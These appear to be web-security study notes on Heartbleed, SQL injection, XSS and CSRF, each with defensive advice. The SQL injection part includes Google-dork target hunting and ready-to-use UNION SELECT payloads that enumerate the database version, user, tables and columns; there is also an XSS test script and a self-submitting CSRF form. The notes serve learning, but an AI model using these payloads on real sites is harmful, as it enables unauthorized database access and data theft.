# Web Security


## Heartbleed Vulnerability 

The SSL standard includes a "heartbeat" option, which provides a way for a computer at one end of the SSL connection to double-check that there's still someone at the other end of the line. This feature is useful because some internet routers will drop a connection if it's idle for too long. In a nutshell, the heartbeat protocol works like this:

<div style="text-align:center;">
    <img src="/images/heartbleed_good.png" alt="Heart Bleed"/>
</div>

The heartbeat message has three parts: a request for acknowledgement, a short, randomly-chosen message (in this case, "banana"), and the number of characters in that message. The server is simply supposed to acknowledge having received the request and parrot back the message.


The Heartbleed attack takes advantage of the fact that the server can be too trusting. When someone tells it that the message has 6 characters, the server automatically sends back 6 characters in response. A malicious user can take take advantage of the server's gullibility:

<div style="text-align:center;">
    <img src="/images/heartbleed_bad.png" alt="Heart Bleed"/>
</div>

Obviously, the word "giraffe" isn't 100 characters long. But the server doesn't bother to check before sending back its response, so it sends back 100 characters. Specifically, it sends back the 7-character word "giraffe" followed by whichever 93 characters happen to be stored after the word "giraffe" in the server's memory. Computers often store information in a haphazard order in an effort to pack it into its memory as tightly as possible, so there's no telling what information might be returned. In this case, the bit of memory after the word "giraffe" contained sensitive personal information belonging to user John Smith.

In the real Heartbleed attack, the attacker doesn't just ask for 100 characters. The attacker can ask for around 64,000 characters of plain text. And it doesn't just ask once, it can send malicious heartbeat messages over and over again, allowing the attacker to get back different fragments of the server's memory each time. In the process, it can gain a wealth of data that was never intended to be available to the public.

The fix for this problem is easy: the server just needs to be less trusting. Rather than blindly sending back as much data as is requested, the server needs to check that it's not being asked to send back more characters than it received in the first place. That's exactly what OpenSSL's fix for the Heartbleed Bug does.

Here's another visualisation to help you understand better.
<div style="text-align:center;">
    <img src="/images/heartbleed_explanation.png" alt="Heart Bleed"/>
</div>


## SQL Injection

Many web applications take user input from a form
Often this user input is used literally in the construction of a SQL query submitted to a database. For example:
SELECT productdata FROM table WHERE  productname = ‘user input product name’;
A SQL injection attack involves placing SQL statements in the user input

Consdier the following example
Let's say we have a product search input field and the user enters the following
blah‘ OR ‘x’ = ‘x

This input is put directly into the SQL statement within the Web application:
$query = “SELECT prodinfo FROM prodtable WHERE prodname = ‘” . $_POST[‘prod_search’] . “’”;
Creates the following SQL:
SELECT prodinfo FROM prodtable WHERE prodname = ‘blah‘ OR ‘x’ = ‘x’
Attacker has now successfully caused the entire table to be returned.


what can be done using sql injection
1) Add new data to the database. Could be embarrassing to find yourself selling politically incorrect items on an eCommerce site
2) Perform an INSERT in the injected SQL
3) Modify data currently in the database. Could be very costly to have an expensive item suddenly be deeply ‘discounted’. Perform an UPDATE in the injected SQL
4) Often can gain access to other user’s system capabilities by obtaining their password
5) Delete records from a database.


using google dorks search for a vulnerable website using 
inurl: products.php?id=
They may be prospective vulnerable websites. 
add a single quote to the url to force an sql error.
http://targetwebsite.com/products.php?prodid=3'
if the mysql error us displayed, we know that the website is vulnerable.


Find the number of columns in a table using ORDER BY.When you get a ERROR it indicates that number of columns has exceeded
```
http://targetwebsite.com/products.php?prodid=3 ORDER BY 1
http://targetwebsite.com/products.php?prodid=3 ORDER BY 2
http://targetwebsite.com/products.php?prodid=3 ORDER BY 3
http://targetwebsite.com/products.php?prodid=3 ORDER BY 4
http://targetwebsite.com/products.php?prodid=3 ORDER BY 5
http://targetwebsite.com/products.php?prodid=3 ORDER BY 6
http://targetwebsite.com/products.php?prodid=3 ORDER BY 7
```

find the columns from which data is being fetched onto the current page using 
```
http://targetwebsite.com/products.php?id=-1 and 1=2 UNION SELECT ALL 1,2,3,4,5,6
```

lets say that data from column 2 is being fetched onto the current page. Then use version to find the SQL version

```
http://targetwebsite.com/products.php?id=-1 and 1=2 UNION SELECT ALL 1,version(),3,4,5,6
```

we can also get the database name using database()
```
http://targetwebsite.com/products.php?id=-1 and 1=2 UNION SELECT ALL 1,database(),3,4,5,6
```

we can also get the current user using user()
```
http://targetwebsite.com/products.php?id=-1 and 1=2 UNION SELECT ALL 1,user(),3,4,5,6
```

get list of tables using 

```
http://targetwebsite.com/products.php?id=-1 and 1=2 UNION SELECT ALL 1,group_concat(table_name),3,4,5,6 from
information_schema.tables where table_schema=database()
```

get the columns using.. use ascii version of the table name
```
http://targetwebsite.com/products.php?prodid=-3 UNION SELECT ALL 1,2,group_concat(column_name),4,5,6 FROM INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=CHAR(117,115,101,114,115);
```


how to protect against SQL injection attacks

1) use bound variables with prepared statements. It works because the parameter values are combined with the compiled statement, not a SQL string.
 SQL injection works by tricking the script into including malicious strings when it creates SQL to send to the database. So by sending the actual SQL separately from the parameters you limit the risk of ending up with something you didn't intend. 
2) Use provided functions for escaping strings
Many attacks can be thwarted by simply using the SQL string escaping mechanism
mysql_real_escape_string() is the preferred function for this 
Will not guard against all attacks
Consider:
SELECT fields FROM table WHERE id = 23 OR 1=1
No quotes here!

3) Check syntax of input for validity. Exclude quotes and semicolons 
Not always possible: consider the name Bill O’Reilly
4) Have length limits on input
Many SQL injection attacks depend on entering long strings

5) Scan query string for undesirable word combinations that indicate SQL statements
INSERT, DROP, etc. 
If you see these, can check against SQL syntax to see if they represent a statement or valid user input

6) Limit database permissions and segregate users
If you’re only reading the database, connect to database as a user that only has read permissions
Never connect as a database administrator in your web application

7) Configure database error reporting
Default error reporting often gives away information that is valuable for attackers (table name, field name, etc.)
Configure so that this information is never exposed to a user


## Http Authentication 


## HTTPS


## SSL 


## Cross Site Scripting (XSS)
Bad web site sends innocent victim a script that steals information from an honest web site. In other words, an attacker's website tries to execute a script on a different website.  

Usually used for strealing the cookies. 

How to check if a site is vulnerable to XSS?
Look for websites that have a form with a text box and type the following
```js
<script> alert("hello") </script>
```
if the script is executed, the website is vulnerable to XSS. But how did it happen?


Reflected Cross Site Scripting. 
The string entered by the attacker, reaches the server


types
Reflected
stored
dom based



## Cross Site Tracing (XST)


## Cross Site Resource Forgery

when youre logged in to a website , a session is created and a session id is set . If the same website is accessed from another window or tab, youre not asked for the credentials agaim... because session id is stored as a cookie. 

During Every subsequent request, the cookie is sent along with the request. and the session ID is validated against the servers records and you are sent back the data.

This funcionality can be exploited by hackers. they can embed requests to these websites as long as the victim is logged in. 

you must've noticed that websites that contain sensitive information like bank websites, log you out pretty often say a 10 minute window
the reason is that, while you are logged into the website, any request to that website is authenticated.

Let's say you are logged in to your bank account. At the same time you happen to open the attakcers page. This causes a forged request to be sent to the bank web server. 
The Bank webserver has no way of knowing whether the request originated from the attacker's page.

<div style="text-align:center;">
    <img src="/images/csrf_info.png" alt="Web Sockets"/>
</div>

Steps in CSRF
1) Victim is logged into vulnerable web site
2) Victim visits malicious page on attacker web site
3) Malicious content is delivered to victim
4) Victim involuntarily sends a request to the vulnerable web site

prerequisites for a csrf attack.
1) The victim must be logged into the website
2) the attacker must know the URL of the target website to which to send the request to.
3) The attacker must know the payload or the parameters to be passed to the URL

The main intent of CSRF attacks is to change the state of data and not to steal data itself.

How to prevent this attack
1) post requests could be used instead of GET, however, the attacker can easily generate POST requests
```html
<form id=“f” action=“http://target.com/”
            method=“post”>
  <input name=“p” value=“42”>
</form>
<script>
  var f = document.getElementById('f');
  f.submit();
</script>

```
2) Referrer header tells from which website the request has originated. The bank or the target website can check for the validity of the referrer header to verify the request since the referrer header cannot be spoofed. This has an issue since legitimate requests that a user makes through proxies and web firewalls would be flagged off as forged.
3) Every time a form is served, add an additional parameter with a secret value (token) and check that it is valid upon submission

```html
<form>
  <!-- Ohter input fields -->
  <input name=“anticsrf” type=“hidden” 
         value=“asdje8121asd26n1” />
</form>

```

If the attacker can guess the token value, then no protection

4) If the token is not regenerated each time a form is served, the application may be vulnerable to replay attacks  
5) Log out from web applications when they have finished using them.
6) Use the web browser with safety – that means making sure not to save any login credentials on the web browser and using legitimate and secure browser extensions.
7) 


